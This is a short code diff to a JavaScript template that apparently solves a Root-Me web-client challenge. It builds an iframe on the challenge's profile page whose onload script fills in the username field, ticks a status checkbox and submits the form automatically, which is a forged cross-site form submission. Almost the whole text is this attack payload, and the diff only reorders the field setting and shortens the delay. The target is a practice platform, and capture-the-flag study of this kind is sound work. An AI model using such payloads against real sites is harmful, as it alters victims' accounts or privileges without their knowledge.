@@ -5,7 +5,8 @@ const html1 = `
  id="iframe1"
  src="http://challenge01.root-me.org/web-client/ch23/?action=profile"
  onload=' const ifr = document.querySelector("#iframe1"); const pseudo = ifr.contentDocument.querySelector("#username"); const status = ifr.contentDocument.querySelector("#status");
- setTimeout(() => {pseudo.value = "test1"; status.checked = true; ifr.contentDocument.forms[0].submit()}, 2000) '
+ pseudo.value = "test1"; status.checked = true;
+ setTimeout(() => {ifr.contentDocument.forms[0].submit()}, 1000) '
 >
 </iframe>
 
